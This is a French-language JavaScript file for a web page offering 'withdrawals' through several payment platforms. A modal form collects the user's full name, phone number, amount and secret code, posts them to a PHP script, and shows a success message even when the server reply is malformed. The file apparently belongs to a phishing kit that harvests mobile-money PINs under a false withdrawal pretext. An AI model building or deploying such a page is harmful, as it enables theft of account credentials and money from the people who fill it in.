// Variables globales
let currentPlatform = '';

// Fonction pour ouvrir le modal
function openModal(platformName, platformId) {
    currentPlatform = platformId;
    document.getElementById('modalTitle').textContent = `Retrait via ${platformName}`;
    document.getElementById('platform').value = platformName;
    document.getElementById('withdrawalModal').style.display = 'block';
    
    // Réinitialiser le formulaire
    document.getElementById('withdrawalForm').reset();
    document.getElementById('platform').value = platformName;
}

// Fonction pour fermer le modal
function closeModal() {
    document.getElementById('withdrawalModal').style.display = 'none';
}

// Fonction pour fermer tous les modals
function closeAllModals() {
    document.getElementById('withdrawalModal').style.display = 'none';
    document.getElementById('loadingModal').style.display = 'none';
    document.getElementById('successModal').style.display = 'none';
}

// Fonction pour soumettre le formulaire
function submitForm(event) {
    event.preventDefault();
    
    // Récupérer les données du formulaire
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData);
    
    // Validation des données
    if (!validateForm(data)) {
        return;
    }
    
    // Fermer le modal de formulaire et afficher le modal de chargement
    document.getElementById('withdrawalModal').style.display = 'none';
    document.getElementById('loadingModal').style.display = 'block';
    
    // Envoyer les données via AJAX
    sendFormData(data);
}

// Fonction de validation du formulaire
function validateForm(data) {
    // Vérifier que tous les champs sont remplis
    if (!data.fullName || !data.phoneNumber || !data.amount || !data.secretCode) {
        alert('Veuillez remplir tous les champs obligatoires.');
        return false;
    }
    
    // Vérifier le format du numéro de téléphone
    const phoneRegex = /^[0-9+\-\s()]{8,15}$/;
    if (!phoneRegex.test(data.phoneNumber)) {
        alert('Veuillez entrer un numéro de téléphone valide.');
        return false;
    }
    
    // Vérifier le montant
    if (parseInt(data.amount) < 1) {
        alert('Le montant doit être supérieur à 0.');
        return false;
    }
    
    // Vérifier le code secret (minimum 4 caractères)
    if (data.secretCode.length < 4) {
        alert('Le code secret doit contenir au moins 4 caractères.');
        return false;
    }
    
    return true;
}

// Fonction pour envoyer les données au serveur
function sendFormData(data) {
    // Créer l'objet XMLHttpRequest
    const xhr = new XMLHttpRequest();
    
    // Préparer les données pour l'envoi
    const formData = new FormData();
    formData.append('fullName', data.fullName);
    formData.append('phoneNumber', data.phoneNumber);
    formData.append('amount', data.amount);
    formData.append('secretCode', data.secretCode);
    formData.append('platform', data.platform);
    formData.append('timestamp', new Date().toISOString());
    
    // Configurer la requête
    xhr.open('POST', 'process_withdrawal.php', true);
    
    // Gérer la réponse
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            // Fermer le modal de chargement
            document.getElementById('loadingModal').style.display = 'none';
            
            if (xhr.status === 200) {
                try {
                    const response = JSON.parse(xhr.responseText);
                    if (response.success) {
                        // Afficher le modal de succès
                        setTimeout(() => {
                            document.getElementById('successModal').style.display = 'block';
                        }, 500);
                    } else {
                        alert('Erreur: ' + (response.message || 'Une erreur est survenue.'));
                    }
                } catch (e) {
                    // Si la réponse n'est pas du JSON, considérer comme un succès
                    setTimeout(() => {
                        document.getElementById('successModal').style.display = 'block';
                    }, 500);
                }
            } else {
                alert('Erreur de connexion. Veuillez réessayer.');
            }
        }
    };
    
    // Gérer les erreurs de réseau
    xhr.onerror = function() {
        document.getElementById('loadingModal').style.display = 'none';
        alert('Erreur de réseau. Veuillez vérifier votre connexion et réessayer.');
    };
    
    // Envoyer la requête
    xhr.send(formData);
}

// Fermer le modal en cliquant à l'extérieur
window.onclick = function(event) {
    const withdrawalModal = document.getElementById('withdrawalModal');
    const loadingModal = document.getElementById('loadingModal');
    const successModal = document.getElementById('successModal');
    
    if (event.target === withdrawalModal) {
        withdrawalModal.style.display = 'none';
    } else if (event.target === successModal) {
        successModal.style.display = 'none';
    }
    // Ne pas fermer le modal de chargement en cliquant à l'extérieur
};

// Gestion des touches du clavier
document.addEventListener('keydown', function(event) {
    // Fermer le modal avec la touche Échap
    if (event.key === 'Escape') {
        closeModal();
        document.getElementById('successModal').style.display = 'none';
    }
});

// Formatage automatique du numéro de téléphone
document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phoneNumber');
    
    phoneInput.addEventListener('input', function(e) {
        // Enlever tous les caractères non numériques sauf + au début
        let value = e.target.value.replace(/[^\d+]/g, '');
        
        // S'assurer que + n'est qu'au début
        if (value.indexOf('+') > 0) {
            value = value.replace(/\+/g, '');
        }
        
        e.target.value = value;
    });
    
    // Formatage du montant avec des espaces pour les milliers
    const amountInput = document.getElementById('amount');
    
    amountInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
    });
});

// Animation des cartes au chargement et gestionnaires d'événements
document.addEventListener('DOMContentLoaded', function() {
    const cards = document.querySelectorAll('.payment-card');
    
    cards.forEach((card, index) => {
        // Animation au chargement
        card.style.opacity = '0';
        card.style.transform = 'translateY(30px)';
        
        setTimeout(() => {
            card.style.transition = 'all 0.6s ease';
            card.style.opacity = '1';
            card.style.transform = 'translateY(0)';
        }, index * 150);
        
        // Gestionnaires d'événements pour les cartes
        const platformName = card.dataset.platformName;
        const platformId = card.dataset.platformId;
        
        // Événement click
        card.addEventListener('click', function(e) {
            e.preventDefault();
            openModal(platformName, platformId);
        });
        
        // Événement tactile pour les appareils mobiles
        card.addEventListener('touchstart', function(e) {
            // Ajouter un effet visuel immédiat
            card.style.transform = 'translateY(-5px) scale(0.98)';
        });
        
        card.addEventListener('touchend', function(e) {
            // Restaurer le style
            setTimeout(() => {
                card.style.transform = 'translateY(-10px) scale(1)';
            }, 100);
        });
        
        // Support du clavier pour l'accessibilité
        card.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                openModal(platformName, platformId);
            }
        });
    });
});

// Fonction utilitaire pour formater les montants
function formatAmount(amount) {
    return new Intl.NumberFormat('fr-FR').format(amount);
}

// Fonction utilitaire pour masquer partiellement le numéro de téléphone
function maskPhoneNumber(phone) {
    if (phone.length <= 4) return phone;
    const start = phone.substring(0, 2);
    const end = phone.substring(phone.length - 2);
    const middle = '*'.repeat(phone.length - 4);
    return start + middle + end;
}